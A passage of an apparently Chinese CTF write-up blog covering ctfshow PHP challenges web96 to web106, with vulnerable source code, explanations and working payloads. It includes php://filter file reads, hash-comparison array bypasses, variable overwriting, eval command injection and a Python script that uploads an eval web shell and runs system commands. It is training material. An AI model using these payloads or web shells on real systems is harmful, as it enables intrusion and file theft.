aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到 flag</p><h4 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phphighlight_file(__FILE__);if(isset($_GET['u']))&#123;    if($_GET['u']=='flag.php')&#123;        die("no no no");    &#125;else&#123;        highlight_file($_GET['u']);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>highligh**<strong>t</strong></strong>_file**    ( string <code>$filen``a``me</code>   [, bool <code>$return</code> = false  ] ) : <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">mixed</a><br>使用 PHP 内置的语法高亮器所定义的颜色，打印输出或者返回 <code>filename</code> 文件中语法高亮版本的代码。  </p><p>参数</p><p><code>filename</code></p><p>欲高亮文件的路径。       </p><p><code>return</code></p><p>设置该参数为 <code>TRUE</code> 使函数返回高亮后的代码。       </p><p>返回值</p><p>如果 <code>ret``u``r``n</code> 设置为 <code>TRUE</code>，高亮后的代码不会被打印输出，而是以字符串的形式返回。     高亮成功返回 <code>TRUE</code>，否则返回 <code>FALSE</code>。 </p><p>所以直接可使用 php 伪协议即可，payload 如下：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?u=php://filter/convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再将拿到密文进行 BASE64 解密即可拿到 flag：<br>ctfshow{894b6c31-5fdd-4680-bd89-7363cf669dbf}</p><h4 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if (isset($_POST['a']) and isset($_POST['b'])) &#123;if ($_POST['a'] != $_POST['b'])if (md5($_POST['a']) === md5($_POST['b']))echo $flag;elseprint 'Wrong.';&#125;?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5强比较（看大佬博客<a href="https://www.wlhhlc.top/posts/16813/">https://www.wlhhlc.top/posts/16813/</a>）<br>md5函数处理数组时会返回NULL，构造NULL=NULL即可，</p><p>则payload为：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">a[]=1&amp;b[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");$_GET?$_GET=&amp;$_POST:'flag';$_GET['flag']=='flag'?$_GET=&amp;$_COOKIE:'flag';$_GET['flag']=='flag'?$_GET=&amp;$_SERVER:'flag';highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三目运算符，可以看到只需管第2行和第6行即可，第二行的意思是如果get传参，则将post里的值赋给get，则可构造payload：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?flag=flagpostHTTP_FLAG='flag'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到flag：ctfshow{a7e2e094-77c9-4d6a-b3e0-703186123675}</p><h4 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>array_push：将一个或多个单元压入数组的末尾（入栈） <br> in_array(<a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">m</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">ixed</a> <code>$needle</code>     , array <code>$hays``ta``ck</code>   [, bool <code>$strict</code> = <code>FALSE</code>    ]  )：检查数组中是否存在某个值</p><p>参数</p><p><code>n``e``edle</code></p><p>待搜索的值。（如果 <code>needle</code> 是字符串，则比较是区分大小写的。  ）</p><p> <code>hay``s``tack</code></p><p>待搜索的数组。 </p><p> <code>strict</code></p><p>如果第三个参数 <code>strict</code> 的值为<code>TRUE</code> 则 <strong>in_array()</strong> 函数还会检查<code>needle</code> 的<a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.types.html">类型</a>是否和      <code>h``aystack</code> 中的相同。 </p><p> 即stric为flase时，为弱比较。</p><p><img src="/images/web_99a.png"></p><p><img src="/images/web_99b.png"></p><p><img src="/images/web_99c.png"></p><p><img src="/images/web_99d.png"></p><p>或用python脚本跑也可：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#-- coding:UTF-8 --</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://cf9d71b2-0624-477b-a743-68be04b5f7e5.challenge.ctf.show/"</span>url1 <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?n=123.php"</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'content'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php @eval($_POST[A]);?>'</span><span class="token punctuation">&#125;</span>shell <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>shell_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"123.php"</span>test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>shell_url<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"写入shell成功"</span><span class="token punctuation">)</span>    data2<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'system("tac flag36d.php");'</span>    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>shell_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125; &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据if里的判断条件可以发现v2里不能有分号，v3里需要有分号，然后又因为=的优先级大于and，则可以令v1=1</p><p>则payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"tac%20ctfshow.php"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到flag,再将0x2d为-</p><p>则flag为：ctfshow{71e05a2f-b325-4095-bfce-3424c1f31559}</p><h4 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span>flag <span class="token keyword">in</span> <span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">;</span>$ctfshow <span class="token operator">=</span> new ctfshow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$v1<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v2<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v3<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v0<span class="token operator">=</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token keyword">and</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span> <span class="token keyword">and</span> is_numeric<span class="token punctuation">(</span>$v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$v0<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> $v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"$v2('ctfshow')$v3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题相比上一题多了很多的过滤，但一时找不到思路，看来哈hint，发现使用了一个ReflectionClass类，一个新的知识点，查阅资料，发现<strong>ReflectionCl****ass</strong> 类报告了一个类的有关信息。 又去看看看各位师傅们的博客，得知PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。<br>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span>echo new ReflectionClass<span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到$flag_a66fbbd30x2d10020x2d4dc50x2d9c150x2d5def81d63d5<br>继续将0x2d换成-</p><p>得ctfshow{a66fbbd3-1002-4dc5-9c15-5def81d63d5}，发现还少一位，进行爆破，依次添加[0-9][a-f]进行尝试。一直尝试到f才成功。</p><p>ctfshow{a66fbbd3-1002-4dc5-9c15-5def81d63d5f}</p><h4 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>$v1 <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v2 <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v3 <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v4 <span class="token operator">=</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span> <span class="token keyword">and</span> is_numeric<span class="token punctuation">(</span>$v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$v4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $s <span class="token operator">=</span> substr<span class="token punctuation">(</span>$v2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $<span class="token builtin">str</span> <span class="token operator">=</span> call_user_func<span class="token punctuation">(</span>$v1<span class="token punctuation">,</span>$s<span class="token punctuation">)</span><span class="token punctuation">;</span>    echo $<span class="token builtin">str</span><span class="token punctuation">;</span>    file_put_contents<span class="token punctuation">(</span>$v3<span class="token punctuation">,</span>$<span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行特殊构造：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.phppostv1=hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后再访问1.php就能看到flag<br><img src="/images/web_102.png"></p><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这题虽然对str进行了过滤php字段，但并没有什么影响，继续使用上一题的payload</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.phppostv1=hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到flag：ctfshow{6d412560-54c7-4afb-adef-3bf37b91c21b}</p><h4 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现使用了sha1函数对v1和v2的值进行比较，根据先前的经验先尝试传进数组，结果发现sha1无法处理数组，会返回NULL，payload如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>postv1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>成功拿到flag：ctfshow{d77537b8-fb35-41d9-bb21-ceddb710a839}</p><h4 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题很明显就是使用变量覆盖，但发现可以输出flag的地方总共有两个，第一个是die($error),第二个就算die($suces),也就是说应该有两种方法<br>第一种：</p><p>通过get传参将flag赋给任意一个自命名的参数(a)，当经过第一个for循环便可得到$a=$flag，同时通过post传参，将a的值赋给error,经过第二个循环便可得到$error=$a,同时满足if的条件，便可得到die($flag)</p><p>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span>flagposterror<span class="token operator">=</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>便可得到flag:ctfshow{42f415f1-3f74-4ef9-b2e5-f73776c56a98}<br>第二种方法：</p><p>（看了大佬们的博客才知道）就是通过get传参，先把flag赋给suces,然后再把flag赋予任何值都可（不太明白为么要把flag的重新赋值）payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>suces<span class="token operator">=</span>flag<span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可拿到flag</p><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> 